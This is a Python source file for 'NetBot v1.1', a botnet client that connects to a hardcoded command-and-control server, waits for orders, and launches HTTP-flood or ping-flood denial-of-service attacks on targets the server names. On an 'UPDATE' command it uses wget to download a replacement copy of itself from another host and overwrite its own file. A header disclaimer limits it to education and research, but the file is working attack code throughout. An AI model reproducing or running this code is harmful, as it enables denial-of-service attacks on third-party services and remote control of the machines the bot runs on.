#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Author       : Shankar Narayana Damodaran
# Contributor  : CloudsOfVenus
# Tool         : NetBot v1.1
#
# Description  : Command & control center client-server code.
#                Should be used only for educational, research purposes, and internal use only.
#

import socket
import time
import threading
import os
import urllib.request
import subprocess
import signal


class LaunchAttack:
    def __init__(self):
        self._running = True

    def terminate(self):
        self._running = False

    def run(self, n):
        run = 0
        if n[3] == "HTTPFLOOD":
            while self._running and attack_set:
                url_attack = f'http://{n[0]}:{n[1]}/'
                try:
                    urllib.request.urlopen(url_attack).read()
                except Exception as e:
                    print(f"Error during HTTPFLOOD attack: {e}")
                time.sleep(int(n[4]))

        elif n[3] == "PINGFLOOD":
            while self._running:
                if attack_set:
                    if run == 0:
                        url_attack = f'ping {n[0]} -i 0.0000001 -s 65000 > /dev/null 2>&1'
                        try:
                            pro = subprocess.Popen(
                                url_attack,
                                stdout=subprocess.PIPE,
                                shell=True,
                                preexec_fn=os.setsid
                            )
                            run = 1
                        except Exception as e:
                            print(f"Error starting PINGFLOOD attack: {e}")
                else:
                    if run == 1:
                        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
                        run = 0
                        break


def main():
    # Flags
    global attack_set, updated, terminate
    attack_set = 0
    updated = 0
    terminate = 0

    host = '10.0.0.169'  # NetBot CCC Server
    port = 5555  # NetBot CCC Port

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))  # Connect to the CCC Server
                message = "HEARTBEAT"  # Sends Alive Pings to CCC Server

                while True:
                    # Send message to server
                    try:
                        s.send(message.encode())
                    except Exception as e:
                        print(f"Error sending data to server: {e}")
                        break

                    # Receive message from server
                    try:
                        data = s.recv(1024).decode()
                    except Exception as e:
                        print(f"Error receiving data from server: {e}")
                        break

                    # Process server response
                    data = data.split('_')
                    if len(data) > 1:
                        att_status, att_host, att_port = data[2], data[0], data[1]
                    else:
                        att_status = "OFFLINE"

                    print(f'CCC Response: {att_status}')

                    if att_status == "LAUNCH":
                        if attack_set == 0:
                            attack_set = 1
                            attack = LaunchAttack()
                            attack_thread = threading.Thread(target=attack.run, args=(data,))
                            attack_thread.start()
                        else:
                            time.sleep(15)
                            if attack_thread.is_alive():
                                print('Attack in Progress...')
                    elif att_status == "HALT":
                        attack_set = 0
                        time.sleep(30)
                    elif att_status == "HOLD":
                        attack_set = 0
                        print('Waiting for Instructions from CCC. Retrying in 30 seconds...')
                        time.sleep(30)
                    elif att_status == "UPDATE":
                        if updated == 0:
                            attack_set = 0
                            try:
                                os.system(
                                    'wget -N http://192.168.0.174/netbot_client.py -O netbot_client.py > /dev/null 2>&1'
                                )
                                print('Client Libraries Updated')
                                updated = 1
                            except Exception as e:
                                print(f"Error updating client libraries: {e}")
                            time.sleep(30)
                        else:
                            time.sleep(30)
                    else:
                        attack_set = 0
                        print('Command Server Offline. Retrying in 30 seconds...')
                        updated = 0
                        time.sleep(30)
        except Exception as e:
            print(f"Error connecting to CCC Server: {e}. Retrying in 15 seconds...")
            time.sleep(15)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting NetBot...")
